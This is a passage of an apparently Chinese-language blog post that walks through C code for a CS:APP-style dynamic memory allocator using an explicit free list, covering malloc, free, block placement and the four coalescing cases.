class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bp = (<span class="keyword">char</span> *)(bp) + <span class="number">3</span> * WSIZE; <span class="comment">// point to payload</span></span><br><span class="line">    <span class="comment">// set 本块信息</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="insert-to-free-list"><a href="#insert-to-free-list" class="headerlink" title="insert_to_free_list"></a>insert_to_free_list</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 将free block插入到free list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp free block的payload的首个地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insert_to_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *head = free_list_head;</span><br><span class="line">    <span class="keyword">void</span> *p = NEXT_FREE_BLKP(head); <span class="comment">// 当前首个有效节点 或者 NULL</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(head), bp);</span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 更新当前要插入的节点</span></span><br><span class="line">        PUT(NEXT_PTR(bp), p);</span><br><span class="line">        PUT(PREV_PTR(bp), head);</span><br><span class="line">        <span class="comment">// 更新head</span></span><br><span class="line">        PUT(NEXT_PTR(head), bp);</span><br><span class="line">        <span class="comment">// 更新p节点(原首有效节点)</span></span><br><span class="line">        PUT(PREV_PTR(p), bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用LIFO策略,将bp所指向的block插入到free_list中.</p><h3 id="mm-malloc-1"><a href="#mm-malloc-1" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><p>注释中说了本函数的工作. 首先从free_list中看有没有适合的块, 否则从heap中分配.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc, 根据 size 返回一个指针，该指针指向这个block的payload首地址</span></span><br><span class="line"><span class="comment"> * 主要工作：</span></span><br><span class="line"><span class="comment"> * 1. size的round操作，满足最小块需求以及对齐限制</span></span><br><span class="line"><span class="comment"> * 2. 首先检查当前free list中是否有可以满足 asize(adjusted size) ，有则place，（place可能需要split),无则第3步</span></span><br><span class="line"><span class="comment"> * 3. 从当前heap中分配新的free block， 插入到free list中，然后place</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mm_malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> asize;      <span class="comment">// Adjusted block size</span></span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// step1: round size 满足最小块和对齐限制</span></span><br><span class="line">    asize = ALIGN(<span class="number">2</span> * DSIZE + size); <span class="comment">// 2*DSIZE = header+ footer + next + prev</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// step2: 从free list 中找free block</span></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;  <span class="comment">//free list中找不到</span></span><br><span class="line">        <span class="comment">// step3: 从当前heap中分配</span></span><br><span class="line">        <span class="keyword">if</span> ((bp = allocate_from_heap(asize)) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        place(bp, asize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc\n&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-fit-1"><a href="#find-fit-1" class="headerlink" title="find_fit"></a>find_fit</h3><p>从free list中找到第一个满足需求size的free block并返回该block的payload首地址.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 使用first-fit policy</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @return void* 成功，返回可用块的首地址</span></span><br><span class="line"><span class="comment"> *               失败，返回NULL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = NEXT_FREE_BLKP(free_list_head); bp != <span class="literal">NULL</span> &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_FREE_BLKP(bp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GET_ALLOC(HDRP(bp)) == <span class="number">0</span> &amp;&amp; size &lt;= GET_SIZE(HDRP(bp)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="place-1"><a href="#place-1" class="headerlink" title="place"></a>place</h3><p>本函数实现,将bp所指向的free block在可能的情况下做split.具体来说,是当当前free block的size &gt;= 请求size+最小block时会做split.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief place block</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> origin_size;</span><br><span class="line">    <span class="keyword">size_t</span> remain_size;</span><br><span class="line"></span><br><span class="line">    origin_size = GET_SIZE(HDRP(bp));</span><br><span class="line">    remain_size = origin_size - size;</span><br><span class="line">    <span class="keyword">if</span> (remain_size &gt;= MIN_BLOCK)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可拆分</span></span><br><span class="line">        <span class="comment">// 设置拆分后剩下的块的size和allocate情况</span></span><br><span class="line">        <span class="keyword">char</span> *remain_blockp = (<span class="keyword">char</span> *)(bp) + size;</span><br><span class="line">        PUT(HDRP(remain_blockp), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(remain_blockp), PACK(remain_size, <span class="number">0</span>));</span><br><span class="line">        <span class="comment">// 更新指针，将剩下块加入到free list中</span></span><br><span class="line">        <span class="keyword">char</span> *prev_blockp = PREV_FREE_BLKP(bp);</span><br><span class="line">        <span class="keyword">char</span> *next_blockp = NEXT_FREE_BLKP(bp);</span><br><span class="line">        PUT(NEXT_PTR(remain_blockp), next_blockp);</span><br><span class="line">        PUT(PREV_PTR(remain_blockp), prev_blockp);</span><br><span class="line">        PUT(NEXT_PTR(prev_blockp), remain_blockp);</span><br><span class="line">        <span class="keyword">if</span> (next_blockp != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            PUT(PREV_PTR(next_blockp), remain_blockp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置分配的块</span></span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 断开原block与free list的连接</span></span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 不可拆分</span></span><br><span class="line">        <span class="comment">// 更新header和footer</span></span><br><span class="line">        PUT(HDRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(origin_size, <span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 移除free block from free list</span></span><br><span class="line">        delete_from_free_list(bp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="delete-from-free-list"><a href="#delete-from-free-list" class="headerlink" title="delete_from_free_list"></a>delete_from_free_list</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 从free list中删除 bp 所在节点</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">delete_from_free_list</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *prev_free_block = PREV_FREE_BLKP(bp);</span><br><span class="line">    <span class="keyword">void</span> *next_free_block = NEXT_FREE_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next_free_block == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_block), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_block), next_free_block);</span><br><span class="line">        PUT(PREV_PTR(next_free_block), prev_free_block);</span><br><span class="line">        <span class="comment">// 断开连接</span></span><br><span class="line">        PUT(NEXT_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">        PUT(PREV_PTR(bp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free-1"><a href="#mm-free-1" class="headerlink" title="mm_free"></a>mm_free</h3><p>这里的free函数和implicit list的free函数一致,重点在coalesce函数.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mm_free</span><span class="params">(<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(ptr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;free\n&quot;</span>);</span><br><span class="line">    debug();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="coalesce-1"><a href="#coalesce-1" class="headerlink" title="coalesce"></a>coalesce</h3><p>coalesce是每种分配器的重点,需要考虑如何合并在虚拟地址空间中的相邻blocks之间的关系, 和implicit一样,explicit也有4种情况:</p><p><img data-src="https://pic.downk.cc/item/5f466750160a154a6795783c.png" alt="image-20200826214359077"></p><p><img data-src="https://pic.downk.cc/item/5f46675f160a154a67957e67.png" alt="image-20200826214409356"></p><p><img data-src="https://pic.downk.cc/item/5f466771160a154a6795847c.png" alt="image-20200826214415780"></p><p><img data-src="https://pic.downk.cc/item/5f46677a160a154a679586f3.png" alt="image-20200826214426686"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 合并地址空间，并将可用free block插入到free list中</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp 当前block的payload首地址</span></span><br><span class="line"><span class="comment"> *           </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *next_blockp = NEXT_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *mem_max_addr = (<span class="keyword">char</span> *)mem_heap_hi() + <span class="number">1</span>; <span class="comment">// heap的上边界</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_alloc = GET_ALLOC(HDRP(prev_blockp));</span><br><span class="line">    <span class="keyword">size_t</span> next_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next_blockp &gt;= mem_max_addr)</span><br><span class="line">    &#123; <span class="comment">// next_block超过heap的上边界，只用考虑prev_blockp</span></span><br><span class="line">        <span class="keyword">if</span> (!prev_alloc)</span><br><span class="line">        &#123;</span><br><span class="line">            case3(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            case1(bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        next_alloc = GET_ALLOC(HDRP(next_blockp));</span><br><span class="line">        <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">        &#123; <span class="comment">// case 1: 前后都已经分配</span></span><br><span class="line">            case1(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc)</span><br><span class="line">        &#123; <span class="comment">//case 3: 前未分配，后分配</span></span><br><span class="line">            case3(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc)</span><br><span class="line">        &#123; <span class="comment">// case 2: 前分配，后未分配</span></span><br><span class="line">            case2(bp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123; <span class="comment">// case 4: 前后都未分配</span></span><br><span class="line">            case4(bp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前后都分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case1</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 前分配后未分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp </span></span><br><span class="line"><span class="comment"> * @return void* </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case2</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *next_blockp = NEXT_BLKP(bp);</span><br><span class="line">    <span class="keyword">void</span> *prev_free_blockp;</span><br><span class="line">    <span class="keyword">void</span> *next_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(next_blockp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新块大小</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新前后free block指针</span></span><br><span class="line">    prev_free_blockp = PREV_FREE_BLKP(next_blockp);</span><br><span class="line">    next_free_blockp = NEXT_FREE_BLKP(next_blockp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边界检查</span></span><br><span class="line">    <span class="keyword">if</span> (next_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), next_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next_free_blockp), prev_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    insert_to_free_list(bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief case 3 前一个block未分配，后一个块已分配</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param bp 当前块的payload首地址</span></span><br><span class="line"><span class="comment"> * @return void* 合并后的payload首地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">case3</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *prev_blockp = PREV_BLKP(bp);</span><br><span class="line">    <span class="keyword">char</span> *prev_free_blockp;</span><br><span class="line">    <span class="keyword">char</span> *next_free_blockp;</span><br><span class="line">    <span class="keyword">size_t</span> size = GET_SIZE(HDRP(bp)) + GET_SIZE(HDRP(prev_blockp));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新块大小</span></span><br><span class="line">    PUT(HDRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(prev_blockp), PACK(size, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到前后free块并更新</span></span><br><span class="line">    next_free_blockp = NEXT_FREE_BLKP(prev_blockp);</span><br><span class="line">    prev_free_blockp = PREV_FREE_BLKP(prev_blockp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边界检查</span></span><br><span class="line">    <span class="keyword">if</span> (next_free_blockp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PUT(NEXT_PTR(prev_free_blockp), next_free_blockp);</span><br><span class="line">        PUT(PREV_PTR(next_free_blockp), prev_free_blockp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// LIFO策略，插入到free list的头部</span></span><br><span class="line">    insert_to_free_list(prev_blockp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="case4"><a href="#case4" class="headerlink" title="case4"></a>case4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 